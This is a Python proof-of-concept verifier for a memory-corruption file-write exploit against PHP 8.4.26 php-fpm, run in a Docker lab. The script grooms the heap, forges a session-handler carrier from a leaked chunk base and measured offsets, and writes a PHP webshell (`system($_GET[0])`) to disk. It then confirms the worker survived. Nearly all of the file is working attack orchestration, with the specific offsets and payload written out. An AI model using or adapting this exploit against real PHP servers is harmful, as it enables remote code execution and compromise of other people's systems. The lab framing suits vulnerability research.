#!/usr/bin/env python3
"""Verify: the single-carrier ps_files->basedir file-write LANDS on fresh php-fpm
workers (fresh-container-per-trial, black-box) with the worker surviving.

K-seated: the 2MB request-chunk base K is read from the worker via a lab observer
(/proc, verifier-only — the stand-in for a chunk-base leak). The ATTACK logic
(build_carrier/stage_parts/session_record) is pure-HTTP; only the K seed + the
PASS/FAIL file check use privileged reads, matching the repo's verifier convention.

Lab (php:8.4.26-fpm behind nginx, pm=static/max_children=1/128M, profile `fpmps`;
session.upload_progress.min_freq=1 realistic throttle; probe.php/arm.php/echo.php
in its webroot; observer.php copied in at run time, not served). NOTE: reusing
`a7r5` (which has the same pm/memory_limit shape) was tried and does NOT work —
its max_file_uploads/max_input_vars=1000000 (vs this lab's tested 20000) shifts
the arm's heap layout by a page (d lands at chunk+0x6a000, not +0x6d000). This
primitive is layout-sensitive enough to need its own calibrated pool.conf:
    docker compose -f docker-compose.fpm-avenues.yml --profile fpmps up -d --build
    # nginx 127.0.0.1:18082
Run:
    python3 -I poc/primitives/write/verify_ps_files_single_carrier_forge.py [ntrials]

Each trial: fresh container -> script_unserialize_oom_arm (cochunk) -> read K (observer)
-> stage the forged carrier + webshell + file part -> check /tmp/PWNED written AND the
same worker PID still serves. PASS = all trials wrote the file and survived.

Measured here: 5/5, /tmp/PWNED written with the session serialization carrying
`<?php system($_GET[0]);?>`, worker PID stable. ps_files chunk-offset 0x56208
(see measure_psfiles_flock.py / offsets 8.4.26-fpm).

d's chunk-offset is NOT reliably fixed (host-condition-sensitive; 0x6a000/0x6d000/
0x6e000/etc. observed). This verifier reads the OBSERVED d_choff each trial and
builds the carrier adaptively (see ps_files_single_carrier_forge.build_carrier) —
it does not assume 0x6d000 and does not skip on a different value.
"""
import os
import subprocess
import sys
import time
import urllib.error
import urllib.request

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.write.ps_files_single_carrier_forge import (  # noqa: E402
    build_carrier, session_record, stage_parts)
from primitives.groom.script_unserialize_oom_arm import cochunk_payload  # noqa: E402

REPO = os.path.dirname(_POC_ROOT)
COMPOSE_FILE = os.path.join(REPO, "docker-compose.fpm-avenues.yml")
LAB = os.path.join(REPO, "lab", "fpmps")
BASE = "http://127.0.0.1:18082"
PROFILE = "fpmps"
CONTAINER = "p2s-fpmps-fpm"
SID = "sess0000000000000000000000000001"
SF = "/tmp/sess_" + SID
PS_FILES_CHOFF = 0x56208
CH = ~0x1fffff
WEBSHELL = b"<?php system($_GET[0]);?>"
TARGET = "/tmp/PWNED"


def comp(*a, t=120):
    return subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "--profile", PROFILE, *a],
                          cwd=REPO, capture_output=True, text=True, timeout=t)


def dx(*c, t=30):
    return subprocess.run(["docker", "exec", CONTAINER, *c], capture_output=True, text=True, timeout=t).stdout


def http(path, data=None, ct=None, t=90, cookie=False):
    req = urllib.request.Request(BASE + path, data=data)
    if ct:
        req.add_header("Content-Type", ct)
    if cookie:   # the arm carries no cookie (an extra header shifts the arm heap a page)
        req.add_header("Cookie", "PHPSESSID=" + SID)
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, repr(e).encode()


def wpid():
    s, b = http("/probe.php", t=8)
    return b.split(b":", 1)[1].decode().strip() if (s == 200 and b.startswith(b"ALIVE:")) else None


def ready():
    for _ in range(60):
        if wpid():
            return True
        time.sleep(0.5)
    return False


def multipart(parts, bnd=b"----l2"):
    out = []
    for name, val, fn in parts:
        h = b'--' + bnd + b'\r\nContent-Disposition: form-data; name="' + name + b'"'
        if fn is not None:
            h += b'; filename="' + fn + b'"\r\nContent-Type: application/octet-stream'
        h += b'\r\n\r\n'
        out.append(h + val + b'\r\n')
    out.append(b'--' + bnd + b'--\r\n')
    return b''.join(out), 'multipart/form-data; boundary=' + bnd.decode()


def chunk_base():
    for tok in dx("php", "/tmp/observer.php").split():
        if tok.startswith("unser.data="):
            return int(tok.split("=")[1], 16)
    return None


def trial(i):
    comp("down", t=60)
    if comp("up", "-d", "--build").returncode != 0 or not ready():
        return f"trial {i}: SKIP (boot)"
    subprocess.run(["docker", "cp", os.path.join(LAB, "observer.php"), f"{CONTAINER}:/tmp/observer.php"],
                   capture_output=True)
    p0 = wpid()
    dx("sh", "-c", f"printf %s '{session_record().decode()}' > {SF}; chown www-data {SF}; rm -f {TARGET}")
    body, ct = multipart([(b"d", cochunk_payload(1100, 4000000), None)])
    http("/arm.php", data=body, ct=ct)
    d = chunk_base()
    if not d:
        return f"trial {i}: no dangle (skip)"
    K = d & CH                                  # leak stand-in (observer gives K AND d_choff)
    carrier = build_carrier(K, d & 0x1fffff, PS_FILES_CHOFF, TARGET, k=0)  # ADAPTIVE on d_choff
    body, ct = multipart(stage_parts(carrier, WEBSHELL))
    http("/echo.php", data=body, ct=ct, cookie=True)
    p1 = wpid()
    ls = dx("sh", "-c", f"ls {TARGET} 2>&1").strip()
    wrote = TARGET in ls and "No such" not in ls
    ok = wrote and p1 is not None and p1 == p0
    return f"trial {i}: d_choff=0x{d & 0x1fffff:x} p0={p0} p1={p1} wrote={wrote} -> {'PASS' if ok else 'FAIL'}"


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 5
    if subprocess.run(["docker", "version"], capture_output=True).returncode != 0:
        print("SKIP: docker unavailable"); return
    results = [trial(i) for i in range(1, n + 1)]
    for r in results:
        print(r)
    comp("down", t=60)
    npass = sum("PASS" in r for r in results)
    print(f"\n{'PASS' if npass == n else 'FAIL'}: {npass}/{n} wrote the file and survived")


if __name__ == "__main__":
    main()
